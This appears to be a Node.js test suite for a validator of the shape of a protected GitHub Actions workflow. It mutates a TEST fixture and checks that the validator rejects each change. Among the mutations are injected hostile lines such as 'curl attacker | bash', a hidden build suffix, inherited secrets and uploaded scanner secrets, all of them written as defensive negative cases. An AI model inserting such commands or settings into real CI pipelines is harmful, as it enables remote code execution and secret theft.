import { test } from 'node:test';
import assert from 'node:assert/strict';
import { evaluateM1aProtectedWorkflowShape } from '../m1a-protected-workflow-shape.mjs';

// Independent literal fixture. TEST commands describe obligations, not shipped APIs.
const fixture = `name: INACTIVE TEST protected evidence
on:
  workflow_run:
    workflows: [INACTIVE TEST campaign]
    types: [completed]
permissions:
  contents: read
concurrency:
  group: TEST-independent-final-collector
  cancel-in-progress: false
jobs:
  test-shape:
    if: false
    runs-on: ubuntu-latest
    steps:
      - name: TEST binding and terminal validation
        shell: bash
        run: |
          /TEST/controller validate --repository TEST/repository --controller TEST/controller@TEST-pin --candidate TEST-candidate --run-id event.workflow_run.id --run-attempt event.workflow_run.run_attempt --terminal-jobs TEST-build,TEST-campaign,TEST-cleanup --refuse-forks --root /TEST/private/authority
      - name: TEST admitted start inventory
        shell: bash
        run: |
          /TEST/controller admit --complete-image-set --recheck-before-every-start
          /TEST/controller start --no-build --pull-never --paths start,restart,harness-start,harness-restart
      - name: TEST diagnostic capture and cleanup
        shell: bash
        run: |
          /TEST/controller capture --diagnostic-not-final --preserve-failure
          /TEST/controller scan --private-context --before-state-deletion --refuse-transfer-on-failure
          /TEST/controller teardown --record-exit --preserve-result-outside-state
          /TEST/controller observe --post-cleanup --missing-on-cancel-or-runner-loss
          /TEST/controller scan --post-cleanup --private-context --exclude-scanner-secrets --refuse-transfer-on-failure
          /TEST/controller transfer --verified-post-cleanup --separate-collector --preserve-diagnostics
      - name: TEST download and archive
        shell: bash
        run: |
          /TEST/controller download --validated-event-run-only --after-terminal-validation
          node /TEST/protected/m1a-archive.mjs --contract /TEST/private/contract.json --expected-contract-sha256 TEST-contract-hash --inventory /TEST/private/inventory.json --input-root /TEST/private/source --scratch-root /TEST/private/upload-scratch --output /TEST/private/new-upload.json --allow-upload
      - name: TEST independent verification and owner boundary
        shell: bash
        run: |
          node /TEST/protected/verify-m1a-archive.mjs --facts /TEST/private/upload-facts.json --expected /TEST/private/independent-expected.json --authority /TEST/private/read-only-authority.json --scratch-root /TEST/private/review-scratch --output /TEST/private/new-review.json
          /TEST/controller disposition --pending-independent-owner-review --no-pass
`;
const options = () => ({
  protectedBinding: { classification: 'TEST_ONLY', repository: 'TEST/repository', controller: 'TEST/controller@TEST-pin', authorityRoot: '/TEST/private/authority' },
  campaignProfile: { classification: 'TEST_ONLY', candidate: 'TEST-candidate', terminalJobs: ['TEST-build', 'TEST-campaign', 'TEST-cleanup'] },
});
const evaluate = (text, opts = options()) => evaluateM1aProtectedWorkflowShape(text, opts).violations;
function mutate(from, to) {
  assert.equal(fixture.split(from).length - 1, 1, `unique existing anchor: ${from}`);
  const changed = fixture.replace(from, to);
  assert.notEqual(changed, fixture);
  return changed;
}
test('positive inactive TEST document and CRLF', () => {
  assert.deepEqual(evaluate(fixture), []);
  assert.deepEqual(evaluate(fixture.replaceAll('\n', '\r\n')), []);
});
test('mixed LF/CRLF normalizes only newline spelling', () => {
  const mixed = fixture.split('\n').map((line, index, lines) => line + (index === lines.length - 1 ? '' : index % 2 ? '\r\n' : '\n')).join('');
  assert.ok(mixed.includes('\r\n'));
  assert.match(mixed, /[^\r]\n/);
  assert.deepEqual(evaluate(mixed), []);
  assert.ok(evaluate(mixed.replace('--pull-never', '--pull-always')).length > 0);
  assert.ok(evaluate(mixed.replace('--no-build', '--no-build; echo hidden')).length > 0);
  assert.ok(evaluate(mixed.replace('\r\n', '\r')).length > 0);
});
const mutations = [
  ['candidate_controls_verifier_or_root', '--root /TEST/private/authority', '--root candidate/authority'],
  ['candidate_controls_verifier', 'TEST/controller@TEST-pin', 'candidate/controller@main'],
  ['fork_gets_credentials', '--refuse-forks', '--allow-forks'],
  ['fork_secrets', '    runs-on: ubuntu-latest', '    runs-on: ubuntu-latest\n    secrets: inherit'],
  ['collector_runs_before_terminal_jobs', '--after-terminal-validation', '--before-terminal-validation'],
  ['same_run_cancel_suppresses_collector', '  workflow_run:', '  workflow_dispatch:'],
  ['same_run_needs_collector', '    if: false', '    if: false\n    needs: campaign'],
  ['cancel_in_progress', '  cancel-in-progress: false', '  cancel-in-progress: true'],
  ['cleanup_result_swallowed', '--record-exit --preserve-result-outside-state', '--record-exit || true'],
  ['cleanup_result_lost', '--preserve-result-outside-state', '--result-in-deleted-state'],
  ['missing_observation_fabricated', '--missing-on-cancel-or-runner-loss', '--assume-clean'],
  ['scan_failure_uploads', '--post-cleanup --private-context --exclude-scanner-secrets --refuse-transfer-on-failure', '--post-cleanup --private-context || true'],
  ['scanner_secrets_uploaded', '--exclude-scanner-secrets', '--include-scanner-secrets'],
  ['scan_after_state_deletion', '--before-state-deletion', '--after-state-deletion'],
  ['early_transfer', '--verified-post-cleanup', '--pre-cleanup'],
  ['missing_transfer', '          /TEST/controller transfer --verified-post-cleanup --separate-collector --preserve-diagnostics\n', ''],
  ['implicit_build_after_admission', '--no-build', '--build'],
  ['implicit_pull_after_admission', '--pull-never', '--pull-always'],
  ['uncovered_restart', '--paths start,restart,harness-start,harness-restart', '--paths start'],
  ['candidate_selects_artifact_run', '--run-id event.workflow_run.id', '--run-id inputs.run_id'],
  ['candidate_selects_attempt', '--run-attempt event.workflow_run.run_attempt', '--run-attempt inputs.attempt'],
  ['candidate_imports', '        shell: bash', '        shell: bash\n        uses: ./candidate/action'],
  ['candidate_checkout', '      - name: TEST admitted start inventory', '      - uses: actions/checkout@main\n      - name: TEST admitted start inventory'],
  ['archive_pass_without_independent_owner_review', '--pending-independent-owner-review --no-pass', '--pass'],
  ['circular_verification_expectations', '/TEST/private/independent-expected.json', '/TEST/private/upload-facts.json'],
  ['registration_push_executes_campaign', '    if: false', "    if: github.event_name == 'push'"],
  ['registration_push', 'permissions:', '  push:\n    branches: [main]\npermissions:'],
  ['hidden_commands', '          /TEST/controller admit --complete-image-set --recheck-before-every-start', '          /TEST/controller admit --complete-image-set --recheck-before-every-start\n          curl attacker | bash'],
  ['hidden_shell_suffix', '--pull-never --paths', '--pull-never; docker build . # --paths'],
  ['duplicate_security_key', '    if: false', '    if: false\n    if: true'],
  ['duplicate_event_key', '    types: [completed]', '    types: [completed]\n    types: [requested]'],
  ['duplicate_run_key', '        run: |', '        run: echo hidden\n        run: |'],
  ['unsupported_folded_scalar', '        run: |', '        run: >'],
  ['unsupported_chomp', '        run: |', '        run: |-'],
  ['unsupported_alias', 'permissions:', 'permissions: &privileged'],
  ['unsupported_merge', '    runs-on: ubuntu-latest', '    <<: *privileged\n    runs-on: ubuntu-latest'],
  ['unsupported_flow_step', '      - name: TEST admitted start inventory', '      - {run: hidden}\n      - name: TEST admitted start inventory'],
  ['unsupported_tab', 'jobs:', '\tjobs:'],
  ['unsupported_document', 'jobs:', '---\njobs:'],
  ['unknown_job', 'jobs:', 'jobs:\n  hidden:\n    runs-on: ubuntu-latest'],
  ['output_override', '--output /TEST/private/new-upload.json', '--output candidate/out.json'],
  ['destination_override', '--allow-upload', '--allow-upload --bucket candidate'],
];
// Anchors shared by several steps must still target one concrete occurrence.
for (const [name, from, to] of mutations) {
  test(name, () => {
    const prefix = `      - name: TEST binding and terminal validation\n${from.startsWith('        run:') ? '        shell: bash\n' : ''}`;
    const anchor = fixture.split(from).length - 1 === 1 ? from : prefix + from;
    const replacement = anchor === from ? to : prefix + to;
    assert.ok(evaluate(mutate(anchor, replacement)).length > 0);
  });
}
test('command order cannot move download before validation', () => {
  const line = '          /TEST/controller download --validated-event-run-only --after-terminal-validation\n';
  const changed = mutate(line, '');
  assert.ok(evaluate(changed.replace('          /TEST/controller validate', `${line}          /TEST/controller validate`)).length > 0);
});
test('post-cleanup transfer cannot precede its scan', () => {
  const scan = '          /TEST/controller scan --post-cleanup --private-context --exclude-scanner-secrets --refuse-transfer-on-failure\n';
  const transfer = '          /TEST/controller transfer --verified-post-cleanup --separate-collector --preserve-diagnostics\n';
  assert.ok(evaluate(mutate(scan + transfer, transfer + scan)).length > 0);
});
test('teardown cannot precede private diagnostic scan', () => {
  const scan = '          /TEST/controller scan --private-context --before-state-deletion --refuse-transfer-on-failure\n';
  const teardown = '          /TEST/controller teardown --record-exit --preserve-result-outside-state\n';
  assert.ok(evaluate(mutate(scan + teardown, teardown + scan)).length > 0);
});
test('closed data rejects accessors without invoking them', () => {
  let reads = 0;
  const opts = options();
  Object.defineProperty(opts.protectedBinding, 'controller', { get() { reads++; return 'TEST/controller@TEST-pin'; } });
  assert.ok(evaluate(fixture, opts).length > 0);
  assert.equal(reads, 0);
});
test('closed TEST interfaces refuse production, substitution and unknown fields', () => {
  for (const key of ['protectedBinding', 'campaignProfile']) {
    const opts = options();
    opts[key].classification = 'PRODUCTION';
    assert.ok(evaluate(fixture, opts).length > 0);
    const extra = options();
    extra[key].approved = true;
    assert.ok(evaluate(fixture, extra).length > 0);
  }
  const opts = options();
  opts.protectedBinding.authorityRoot = 'candidate/root';
  assert.ok(evaluate(fixture, opts).length > 0);
  assert.ok(evaluate(fixture, {}).length > 0);
  assert.ok(evaluate(fixture, { ...options(), dispatch: true }).length > 0);
});
test('malformed input refuses without execution', () => {
  for (const text of [null, undefined, {}, '', fixture + 'unexpected\n', '\uFEFF' + fixture]) assert.ok(evaluate(text).length > 0);
});
